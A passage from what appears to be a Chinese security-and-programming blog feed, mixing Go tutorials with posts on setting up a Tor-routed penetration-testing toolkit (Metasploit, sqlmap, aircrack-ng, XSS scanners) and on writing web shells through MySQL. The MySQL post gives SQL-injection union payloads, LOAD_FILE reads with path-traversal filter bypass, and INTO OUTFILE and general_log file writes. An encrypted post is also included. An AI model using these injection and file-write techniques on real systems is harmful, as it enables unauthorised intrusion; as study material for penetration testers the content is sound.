    <content type="text"><![CDATA[linux学习资料推荐 QQ群：397745473 linux学习资料推荐 12345https://developer.aliyun.com/adc/labs/https://edu.aliyun.com/course/explore/Linux_Systemhttps://i.linuxtoy.org/docs/guide/参考：https://www.zhihu.com/question/439291573 赚买VPS： https://www.vultr.com/?ref=6851639 QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang执行操作系统命令]]></title>
    <url>%2F2021%2F01%2F20%2F153_go%E6%89%A7%E8%A1%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[golang执行操作系统命令 Go 语言使用 os/exec 执行 Shell 命令 QQ群：397745473 1. os/exec1.1 只执行命令，不要输出结果 执行命令可以使用Run()或者Start()方法，Run()是阻塞的执行，Start()是非阻塞的执行： 1234567891011121314package mainimport ( &quot;fmt&quot; &quot;os/exec&quot;)func main() &#123; command := exec.Command(&quot;ping&quot;,&quot;www.baidu.com&quot;) err := command.Run() // 阻塞执行 if err != nil&#123; fmt.Println(err.Error()) &#125;&#125; 2. go-sh go-sh - 替代 os/exec 执行命令 | Github 3. ssh 远程执行命令// TODO: To be updated…\ golang-ssh-01: 执行远程命令 | MojoTech Golang 远程执行命令 | CSDN Go 执行远程 ssh 命令 | bbsmax 如何使用 Go 语言实现远程执行命令 | TeaKKi gossh - 极简的 ssh 管理工具，支持多台主机、远程执行命令、传递文件 | Github gossh 使用示例 | Github Linux 自动化远程管理工具 gossh 开源了 - 李文塔 | CSDN 参考文章相关的库 go-sh - 替代 os/exec 执行命令 | Github go-homedir - 替代 os/user 获取 home 目录，支持交叉编译 | Github gossh - 极简的 ssh 管理工具，支持多台主机、远程执行命令、传递文件 | Github 文章教程 Go 语言中执行命令的几种方式 | 杨彦星 Golang exec 命令执行 | 简书 Golang os/exec 执行外部命令 | 简书 Golang 执行系统命令 os/exec | 01happy 如何用 Go 调用 Windows API | Razeen’s Blog Go 学习笔记 (八) - 使用 os/exec 执行命令 | Razeen’s Blog [译]使用 os/exec 执行命令 | 鸟窝 golang-ssh-01: 执行远程命令 | MojoTech Golang 远程执行命令 | CSDN Go 执行远程 ssh 命令 | bbsmax 如何使用 Go 语言实现远程执行命令 | TeaKKi 其他暂存 Go 学习笔记 (六) - 使用 swaggo 自动生成 Restful API 文档 | Razeen’s Blog Go 语言中关于文件路径的使用总结 | 杨彦星 Go 语言中函数使用不定参数问题 | 杨彦星 Go 语言“可变参数函数”终极指南 | Go 语言中文网 CODING 代码多仓库实践 | CODING 博客 GitLab Centos7 搭建 GitLab 服务器并配置项目全过程 | CSDN 搭建 GitLab 服务 | SegmentFault QQ群：397745473]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux搭建渗透测试环境记录]]></title>
    <url>%2F2021%2F01%2F15%2F150_linux%E6%90%AD%E5%BB%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[linux搭建渗透测试环境记录 QQ群：397745473 1原文： https://forum.antichat.ru/threads/462776/ 0.简介本文适用于初学者。 它将告诉您如何用常用工具来补充您的家庭Linux系统，以及提供一些匿名性。 我绝不会忘记Kali Linux和类似操作系统的存在，而且我也不会试图彻底改变这个想法。 将在其上执行所有操作的操作系统是Linux Mint 18.3，对于其他操作系统，可能需要稍作调整才能安装和配置以下所述的实用程序。 1.匿名为了确保某种匿名性，我们将使用Tor和VPN 1234sudo suapt updateapt install git golang openvpnapt install tor torsocks 下一步是安装toriptables2。 该脚本用于配置tor和iptables，以确保绝对所有服务都可以通过tor进行工作。 1234cd /tmpgit clone https://github.com/ruped24/toriptables2cd toriptables2/mv toriptables2.py /usr/local/bin/toriptables2 将tor和toriptables2添加到启动 1systemctl enable tor 让我们创建一个文件/etc/init.d/toriptables2，其内容如下： 12#!/bin/bashtoriptables2 -l 让我们在启动时包含此脚本。 12chmod +x /etc/init.d/toriptables2update-rc.d toriptables2 defaults 此外，安装AutoVPN。 12345сd /tmpgit clone https://github.com/adtac/autovpncd autovpngo build autovpn.gomv autovpn /usr/local/bin/ AutoVPN用于连接从VPN Gate获得的随机VPN。 不幸的是，很难找到可用的VPN，服务器通常会过载，最好使用您的VPN。 12345//执行:autovpn//可以指定所需的国家，例如：autovpn BR 2.有用的工具2.1 Nmap和Metasploit第一步是安装Java 8： 123add-apt-repository -y ppa:webupd8team/javaapt updateapt install oracle-java8-installer 安装Metasploit依赖项： 1apt install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer libyaml-dev curl zlib1g-dev 安装Ruby 2.5.1版 12345678910111213cd ~git clone git://github.com/sstephenson/rbenv.git .rbenvecho &apos;export PATH=&quot;$HOME/.rbenv/bin:$PATH&quot;&apos; &gt;&gt; ~/.bashrcecho &apos;eval &quot;$(rbenv init -)&quot;&apos; &gt;&gt; ~/.bashrcexec $SHELLgit clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-buildecho &apos;export PATH=&quot;$HOME/.rbenv/plugins/ruby-build/bin:$PATH&quot;&apos; &gt;&gt; ~/.bashrcexec $SHELLRUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )rbenv install $RUBYVERSIONrbenv global $RUBYVERSIONln ~/.rbenv/versions/2.5.1/bin/ruby /usr/local/bin/rubyruby -v PostgreSQL设置 12345su postgrescreateuser achat -P -S -R -D// Password 123123createdb -O achat achatexit 安装nmap 123456cd /tmpgit clone https://github.com/nmap/nmap.gitcd nmap./configuremakemake install 让我们直接去安装Metasploit 1234567cd /optsudo git clone https://github.com/rapid7/metasploit-framework.gitsudo chown -R `whoami` /opt/metasploit-frameworkcd metasploit-frameworkgem install bundlerbundle installbash -c &apos;for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done&apos; 使用数据库设置/opt/metasploit-framework/config/database.yml创建文件 123456789production: adapter: postgresql database: achat username: achat password: 123123 host: 127.0.0.1 port: 5432 pool: 75 timeout: 5 尝试运行命令nmap和msfconsole 2.2 PytheM另一个多功能框架安装依赖 12345apt install build-essential python-dev libnetfilter-queue-dev libffi-dev libssl-dev libpcap-dev python-pippip install setuptoolspip install scapypip install termcolorpip install psutil 自行安装PytheM 123456git clone https://github.com/m4n3dw0lf/PytheM.gitcd PytheMpython setup.py install//尝试执行pythem 2.3 Aircrack-NG可以从Mint存储库中安装Aircrack-NG，但我们将从源代码构建以获取最新版本。安装依赖 1apt install autoconf automake libgcrypt20-dev libtool libpcre3-dev libnl-3-dev libsqlite3-dev libssl-dev ethtool build-essential g++ libnl-genl-3-dev pkg-config Aircrack-NG安装 1234567git clone https://github.com/aircrack-ng/aircrack-ng.gitcd aircrack-ng/autoreconf -i./configure --with-experimental --with-ext-scriptsmakemake installairodump-ng-oui-update 2.4 BruteXSSBruteXSS是用于检查Web应用程序对XSS攻击的漏洞的实用程序。 知道如何处理GET和POST请求。 用Python编写的安装非常简单，仅使用标准库。 1234cd /optgit clone https://github.com/shawarkhanethicalhacker/BruteXSS.gitcd BruteXSSpython brutexss.py 2.5 SqlMap没有SqlMap的情况下，我们可以去哪里：)用python编写的安装一样容易，不需要其他库。 从github下载并使用它。 1234cd /optgit clone https://github.com/sqlmapproject/sqlmap.git sqlmapcd sqlmap/python sqlmap.py --wizard 附言 加密您的数据 对于加密，我建议使用cryptsetup实用程序（dm-cryp）。 2.6 安装rapidscan1234567git clone https://github.com/skavngr/rapidscan.gitcd rapidscan/chmod +x rapidscan.pypython rapidscan.py -hcd rapidscan/./rapidscan.py doamin.com 2.7 安装简单快速的侦察扫描仪-Striker 描述： Check and Bypass CloudflareRetrieve Server and Powered by HeadersFingerprint the operating system of Web ServerDetect CMS (197+ CMSs are supported)Launch WPScan if target is using WordpressRetrieve robots.txtWhois lookupCheck if the target is a honeypotPort Scan with banner grabbingDumps all kind of DNS recordsGenerate a map for visualizing the attack surfaceGather Emails related to the targetFind websites hosted on the same web serverFind hosts using googleCrawl the website for URLs having parametersSQLi scan using online implemention of SQLMap (takes &lt; 3 min.)Basic XSS scanning 1234git clone https://github.com/UltimateHackers/Strikercd Strikerpip install -r requirements.txtpython striker.py 其他工具参考：123456789101112https://forum.surabayahackerlink.org/d/3462-new-challenges-undergroundhttps://evilc0de.blogspot.com/----------------https://github.com/OJ/gobusterhttps://github.com/maurosoria/dirsearchhttps://github.com/ffuf/ffufhttps://geekflare.com/open-source-web-security-scanner/https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/https://netsec.ws/?p=309http://pentestmonkey.net/tools/audit/unix-privesc-check QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql写shell的一点总结]]></title>
    <url>%2F2020%2F12%2F31%2F149_mysql%E5%86%99shell%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[mysql写shell的一点总结 QQ群：397745473 mysql写shell的一点总结 12文章来源： https://v0w.top/2020/03/14/mysql-getshell/#3-3-%E5%88%9B%E5%BB%BA%E8%A1%A8%EF%BC%8C%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE 0x00 前言利用SQL注入，当存在一定的利用条件时，我们可以利用mysql进行文件的写入，在知道网站绝对路径的情况下，可以通过这种方式写入shell。 0x01 利用条件 数据库当前用户为root权限或者至少有FILE权限 123456789mysql&gt; select file_priv,user,host from mysql.user;+-----------+------+-----------+| file_priv | user | host |+-----------+------+-----------+| Y | root | localhost || Y | root | 127.0.0.1 || Y | root | ::1 |+-----------+------+-----------+3 rows in set (0.00 sec) 知道当前网站的绝对路径 php的gpc为off状态, 在开启gpc的情况下，可以通过十六进制的路径读写文件 写入的那个路径存在写权限 secure_file_priv=&#39;&#39; 12345678910111213141516mysql&gt; select @@secure_file_priv;+-----------------------+| @@secure_file_priv |+-----------------------+| /var/lib/mysql-files/ |+-----------------------+1 row in set (0.00 sec)secure_file_priv可以设置如下这样进行设置：1. 设置为空，那么对所有路径均可进行导入导出。2. 设置为一个目录名字，那么只允许在该路径下导入导出。3. 设置为Null，那么禁止所有导入导出。需要在mysql的配置文件中更改：[mysqld]secure_file_priv=&quot;&quot; 0x02 读取web路径2.1 利用报错有时候information_schema.tables不能用时，在MySQL 5.6及以上版本中可以使用以下表 12?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()%23&amp;Submit=Submit%23?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name=schema()%23&amp;Submit=Submit%23 2.2 phpinfo 2.3 load_file读配置文件1SELECT LOAD_FILE(&apos;/etc/apache2/sites-available/default&apos;); 有时候过滤了敏感路径可以试试这样： 1SELECT LOAD_FILE(&apos;/etc/otherdir/../passwd&apos;); 2.4 通过mysql函数和全局变量 查找mysql安装目录1234567891011121314151617181920212223mysql&gt; select @@basedir;+-----------+| @@basedir |+-----------+| /usr/ |+-----------+1 row in set (0.01 sec)mysql&gt; select @@datadir;+-----------------+| @@datadir |+-----------------+| /var/lib/mysql/ |+-----------------+1 row in set (0.00 sec)mysql&gt; show variables like &apos;datadir&apos;;+---------------+-----------------+| Variable_name | Value |+---------------+-----------------+| datadir | /var/lib/mysql/ |+---------------+-----------------+1 row in set (0.01 sec) @@ 用于系统变量 @ 往往用于用户定义的变量 0x03 常见方法写shell3.1 select * into12345mysql&gt; select &apos;&lt;? phpinfo(); ?&gt;&apos; into outfile &apos;E:/1.txt&apos;;Query OK, 1 row affected (0.00 sec)mysql&gt; select &apos;&lt;? phpinfo(); ?&gt;&apos; into outfile &apos;E:/1.txt&apos;;Query OK, 1 row affected (0.00 sec) 3.2 基于log日志写shell法 http://sh1yan.top/2018/05/26/mysql-writ-shell/ 查询当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，并且记录下原地址，方便后面恢复。 set global general_log = on;开启日志监测，一般是关闭的，如果一直开，文件会很大的。 set global general_log_file = ‘G:/2.txt’;这里设置我们需要写入的路径就可以了。 select ‘’;查询一个一句话，这个时候log日志里就会记录这个。 set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;结束后，再修改为原来的路径。 set global general_log = off;关闭下日志记录。 20200322145847.png 3.3 创建表，导出数据其实和第一种方法差不多。 123456use test;drop table if exists vow;create table vow(name text not null);insert into vow(name) values(&apos;&lt;?php phpinfo(); ?&gt;&apos;);select name from vow into outfile &apos;E:/5.txt&apos;;drop tables vow; QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在线远程虚拟桌面]]></title>
    <url>%2F2020%2F12%2F29%2F148_%E5%9C%A8%E7%BA%BF%E8%BF%9C%E7%A8%8B%E8%99%9A%E6%8B%9F%E6%A1%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[在线远程虚拟桌面 推荐一个站点 Apache 的 Glyptodon QQ群：397745473 使用方法： 1、glyptodon免费提供demo，我们只需要通过浏览器打开：https://demo.glyptodon.com/#/ （建议使用电脑浏览器体验，如果打不开就是和谐了） 2、然后glyptodon会自动分配远程虚拟机，我们点击OK 3、等到系统分配完毕，我们就可以看到如自家电脑桌面的平台，我们通过打开桌面上的谷歌浏览器“Google Chrome”，就可以畅玩世界各地的网站啦。 4、由于glyptodon的限制，我们连接虚拟机5-15分钟之后需要重新链接一次，这点有点很烦。 1地址：https://demo.glyptodon.com 国内被墙可以设host解决： 12342019-08-02 备注：最近该域名已经被墙，解决办法，修改 hosts，在本地 hosts 文件添加如下内容： 13.57.99.105 demo.glyptodon.com 其他类似的有： 123456https://rabb.it/https://w.kast.live/https://youtu.be/ypD3WBOjeAY官方Glyptodon Enterprise安装教程https://blog.shiyunhong.com/2741.html QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang常用的http请求操作]]></title>
    <url>%2F2020%2F12%2F28%2F147_golang%E5%B8%B8%E7%94%A8http%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[golang常用的http请求操作 QQ群：397745473 1参考：https://www.cnblogs.com/zhaof/p/11346412.html 之前用python写各种网络请求的时候写的非常顺手，但是当打算用golang写的时候才发现相对来说还是python的那种方式用的更加顺手，习惯golang的用法之后也就差别不大了，下面主要整理了常用的通过golang发起的GET请求以及POST请求的代码例子 golang发起GET请求基本的GET请求1234567891011121314151617181920212223//基本的GET请求package mainimport ( "fmt" "io/ioutil" "net/http")func main() &#123; resp, err := http.Get("http://httpbin.org/get") if err != nil &#123; fmt.Println(err) return &#125; defer resp.Body.Close() body, err := ioutil.ReadAll(resp.Body) fmt.Println(string(body)) fmt.Println(resp.StatusCode) if resp.StatusCode == 200 &#123; fmt.Println("ok") &#125;&#125; 带参数的Get请求12345678910111213141516171819package mainimport ( "fmt" "io/ioutil" "net/http")func main()&#123; resp, err := http.Get("http://httpbin.org/get?name=zhaofan&amp;age=23") if err != nil &#123; fmt.Println(err) return &#125; defer resp.Body.Close() body, _ := ioutil.ReadAll(resp.Body) fmt.Println(string(body))&#125; 但是如果我们想要把一些参数做成变量而不是直接放到url中怎么操作，代码例子如下： 1234567891011121314151617181920212223242526package mainimport ( "fmt" "io/ioutil" "net/http" "net/url")func main()&#123; params := url.Values&#123;&#125; Url, err := url.Parse("http://httpbin.org/get") if err != nil &#123; return &#125; params.Set("name","zhaofan") params.Set("age","23") //如果参数中有中文参数,这个方法会进行URLEncode Url.RawQuery = params.Encode() urlPath := Url.String() fmt.Println(urlPath) // https://httpbin.org/get?age=23&amp;name=zhaofan resp,err := http.Get(urlPath) defer resp.Body.Close() body, _ := ioutil.ReadAll(resp.Body) fmt.Println(string(body))&#125; 解析JSON类型的返回结果12345678910111213141516171819202122232425262728package mainimport ( "encoding/json" "fmt" "io/ioutil" "net/http")type result struct &#123; Args string `json:"args"` Headers map[string]string `json:"headers"` Origin string `json:"origin"` Url string `json:"url"`&#125;func main() &#123; resp, err := http.Get("http://httpbin.org/get") if err != nil &#123; return &#125; defer resp.Body.Close() body, _ := ioutil.ReadAll(resp.Body) fmt.Println(string(body)) var res result _ = json.Unmarshal(body,&amp;res) fmt.Printf("%#v", res)&#125; GET请求添加请求头1234567891011121314151617package mainimport ( "fmt" "io/ioutil" "net/http")func main() &#123; client := &amp;http.Client&#123;&#125; req,_ := http.NewRequest("GET","http://httpbin.org/get",nil) req.Header.Add("name","zhaofan") req.Header.Add("age","3") resp,_ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) fmt.Printf(string(body))&#125; 从上述的结果可以看出我们设置的头是成功了： 123456789101112&#123; "args": &#123;&#125;, "headers": &#123; "Accept-Encoding": "gzip", "Age": "3", "Host": "httpbin.org", "Name": "zhaofan", "User-Agent": "Go-http-client/1.1" &#125;, "origin": "211.138.20.170, 211.138.20.170", "url": "https://httpbin.org/get"&#125; golang 发起POST请求基本的POST使用1234567891011121314151617package mainimport ( "fmt" "io/ioutil" "net/http" "net/url")func main() &#123; urlValues := url.Values&#123;&#125; urlValues.Add("name","zhaofan") urlValues.Add("age","22") resp, _ := http.PostForm("http://httpbin.org/post",urlValues) body, _ := ioutil.ReadAll(resp.Body) fmt.Println(string(body))&#125; 结果如下： 12345678910111213141516171819&#123; "args": &#123;&#125;, "data": "", "files": &#123;&#125;, "form": &#123; "age": "22", "name": "zhaofan" &#125;, "headers": &#123; "Accept-Encoding": "gzip", "Content-Length": "19", "Content-Type": "application/x-www-form-urlencoded", "Host": "httpbin.org", "User-Agent": "Go-http-client/1.1" &#125;, "json": null, "origin": "211.138.20.170, 211.138.20.170", "url": "https://httpbin.org/post"&#125; 另外一种方式1234567891011121314151617181920package mainimport ( "fmt" "io/ioutil" "net/http" "net/url" "strings")func main() &#123; urlValues := url.Values&#123; "name":&#123;"zhaofan"&#125;, "age":&#123;"23"&#125;, &#125; reqBody:= urlValues.Encode() resp, _ := http.Post("http://httpbin.org/post", "text/html",strings.NewReader(reqBody)) body,_:= ioutil.ReadAll(resp.Body) fmt.Println(string(body))&#125; 结果如下： 12345678910111213141516&#123; "args": &#123;&#125;, "data": "age=23&amp;name=zhaofan", "files": &#123;&#125;, "form": &#123;&#125;, "headers": &#123; "Accept-Encoding": "gzip", "Content-Length": "19", "Content-Type": "text/html", "Host": "httpbin.org", "User-Agent": "Go-http-client/1.1" &#125;, "json": null, "origin": "211.138.20.170, 211.138.20.170", "url": "https://httpbin.org/post"&#125; 发送JSON数据的post请求12345678910111213141516171819202122package mainimport ( "bytes" "encoding/json" "fmt" "io/ioutil" "net/http")func main() &#123; client := &amp;http.Client&#123;&#125; data := make(map[string]interface&#123;&#125;) data["name"] = "zhaofan" data["age"] = "23" bytesData, _ := json.Marshal(data) req, _ := http.NewRequest("POST","http://httpbin.org/post",bytes.NewReader(bytesData)) resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) fmt.Println(string(body))&#125; 结果如下： 123456789101112131415161718&#123; "args": &#123;&#125;, "data": "&#123;\"age\":\"23\",\"name\":\"zhaofan\"&#125;", "files": &#123;&#125;, "form": &#123;&#125;, "headers": &#123; "Accept-Encoding": "gzip", "Content-Length": "29", "Host": "httpbin.org", "User-Agent": "Go-http-client/1.1" &#125;, "json": &#123; "age": "23", "name": "zhaofan" &#125;, "origin": "211.138.20.170, 211.138.20.170", "url": "https://httpbin.org/post"&#125; 不用client的post请求12345678910111213141516171819package mainimport ( "bytes" "encoding/json" "fmt" "io/ioutil" "net/http")func main() &#123; data := make(map[string]interface&#123;&#125;) data["name"] = "zhaofan" data["age"] = "23" bytesData, _ := json.Marshal(data) resp, _ := http.Post("http://httpbin.org/post","application/json", bytes.NewReader(bytesData)) body, _ := ioutil.ReadAll(resp.Body) fmt.Println(string(body))&#125; QQ群：397745473]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GOlang高效扫描框架]]></title>
    <url>%2F2020%2F12%2F23%2F146_GOlang%E9%AB%98%E6%95%88%E6%89%AB%E6%8F%8F%E6%A1%86%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[GOlang高效扫描框架 golang的扫描框架, 支持协程池和自动调节协程个数. 在30min内扫描391W的ULR(根据带宽和配置改变, 和Zmap不同, Zmap是无连接状态扫描) QQ群：397745473 1https://github.com/jmpews/goscan Before run set ulimit -n 100000 set PayloadType type (maybe i will add relfect) set maxWorkers, jobQueueLen and feedback mechanism 12345678// if you set a fixed number of goroutine, set feedback-mechanism `false` and maxWorkers == jobCacheQueueLen`// Example: pool = NewGoroutinePool(100, 100, false)// if you use feedback-mechanism, set `feedback = true`, maxWorkers and jobCacheQueueLen// Example: pool := NewGoroutinePool(100, 1000, true)// 1000 maxWorkers and 20000 jobCacheQueueLen, with feedback mechanismpool := NewGoroutinePool(1000, 20000, true) Cross compilation (Best Choice)1GOOS=linux GOARCH=amd64 go build -v scanner.go pool.go Just Run1./scanner Run with new Golang Env12345678910111213sudo locale-gen zh_CN.UTF-8sudo locale-gen zh_CN.UTF-8 en_US.UTF-8wget https://storage.googleapis.com/golang/go1.7.3.linux-amd64.tar.gztar -C /usr/local -xzf go1.7.3.linux-amd64.tar.gzecho &apos;PATH=$PATH:/usr/local/go/bin&apos; &gt;&gt; ~/.profileecho &apos;GOPATH=/tmp&apos; &gt;&gt; ~/.profile. ~/.profilego get github.com/pborman/uuidgo run scanner.go pool.go Run with docker123$ git clone https://github.com/jmpews/goscan.git$ cd goscan/$ docker run --rm -v &quot;$PWD&quot;:/usr/src/myapp -w /usr/src/myapp golang:1.7 go get github.com/pborman/uuid &amp;&amp; go build -v scanner.go pool.go QQ群：397745473]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让python使用selenium调用Tor浏览器]]></title>
    <url>%2F2020%2F12%2F18%2F143_%E8%AE%A9python%E4%BD%BF%E7%94%A8selenium%E8%B0%83%E7%94%A8Tor%E6%B5%8F%E8%A7%88%E5%99%A8%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试环境搭建脚本记录]]></title>
    <url>%2F2020%2F12%2F18%2F144_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! 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